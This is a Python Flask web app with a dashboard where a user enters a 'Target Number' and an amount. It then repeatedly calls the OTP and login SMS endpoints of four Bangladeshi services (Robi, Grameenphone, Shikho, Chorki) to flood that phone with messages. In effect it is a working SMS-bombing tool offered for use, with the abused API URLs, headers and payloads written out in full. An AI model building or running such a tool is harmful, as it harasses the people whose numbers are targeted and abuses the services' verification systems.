from flask import Flask, request, jsonify, render_template_string
import requests
import json
import time

app = Flask(__name__)

# Dashboard HTML Template (Bootstrap 5)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS API Dashboard | Tnayem48</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Poppins', sans-serif; background: #f4f7f6; }
        .card { border: none; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .btn-primary { background: #6c5ce7; border: none; border-radius: 10px; padding: 12px; }
        .btn-primary:hover { background: #a29bfe; }
        .header { background: #6c5ce7; color: white; padding: 40px 0; border-radius: 0 0 50px 50px; margin-bottom: -50px; }
    </style>
</head>
<body>
    <div class="header text-center">
        <h2>🚀 API Control Panel</h2>
        <p>Managed by Tnayem48</p>
    </div>
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="card p-4">
                    <div class="mb-3">
                        <label class="form-label">Target Number</label>
                        <input type="text" id="num" class="form-control" placeholder="017XXXXXXXX">
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Amount</label>
                        <input type="number" id="amount" class="form-control" value="1" max="20">
                    </div>
                    <button onclick="sendRequest()" id="sendBtn" class="btn btn-primary w-100">Send Requests</button>
                    <div id="result" class="mt-4"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        async function sendRequest() {
            const num = document.getElementById('num').value;
            const amount = document.getElementById('amount').value;
            const btn = document.getElementById('sendBtn');
            const resDiv = document.getElementById('result');

            if(!num) return alert("Please enter a number");

            btn.disabled = true;
            btn.innerText = "Processing...";
            resDiv.innerHTML = '<div class="alert alert-info">Sending... Please wait.</div>';

            try {
                const response = await fetch(`/api?num=${num}&amount=${amount}`);
                const data = await response.json();
                resDiv.innerHTML = `<div class="alert ${data.status === 'success' ? 'alert-success' : 'alert-danger'}">${data.message}</div>`;
            } catch (err) {
                resDiv.innerHTML = '<div class="alert alert-danger">Error connecting to API.</div>';
            }
            btn.disabled = false;
            btn.innerText = "Send Requests";
        }
    </script>
</body>
</html>
"""

API_LIST = [
    {
        "name": "Robi Wifi",
        "url": "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "Referer": "https://robiwifi.robi.com.bd/"},
        "data": {"login": "p"}
    },
    {
        "name": "GP Web",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": {"msisdn": "p"}
    },
    {
        "name": "Shikho",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "origin": "https://shikho.com", "referer": "https://shikho.com/"},
        "data": {"phone": "880p", "type": "student", "auth_type": "login", "vendor": "shikho"}
    },
    {
        "name": "Chorki",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": {"number": "+880p"}
    }
]

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api')
def handle_api():
    num = request.args.get('num')
    amount = request.args.get('amount', default=1, type=int)

    if not num:
        return jsonify({"status": "error", "message": "Number missing"}), 400

    clean_num = num[-10:] # last 10 digits
    success_count = 0

    for _ in range(amount):
        for api in API_LIST:
            try:
                # Replace 'p' with actual number
                str_data = json.dumps(api.get("data", {}))
                str_data = str_data.replace("880p", "880" + clean_num).replace("p", clean_num).replace("+880p", "+880" + clean_num)
                payload = json.loads(str_data)

                if api["method"] == "POST":
                    r = requests.post(api["url"], json=payload, headers=api.get("headers"), timeout=5)
                else:
                    # GET handling logic if needed
                    r = requests.get(api["url"], params={"phone": num}, timeout=5)

                if r.status_code == 200 or r.status_code == 201:
                    success_count += 1
                
                time.sleep(0.3)
            except:
                continue

    if success_count > 0:
        return jsonify({"status": "success", "message": f"successfully sent by Tnayem48. Total: {success_count}"})
    else:
        return jsonify({"status": "error", "message": "try again later with a small amount."})

if __name__ == '__main__':
    app.run()
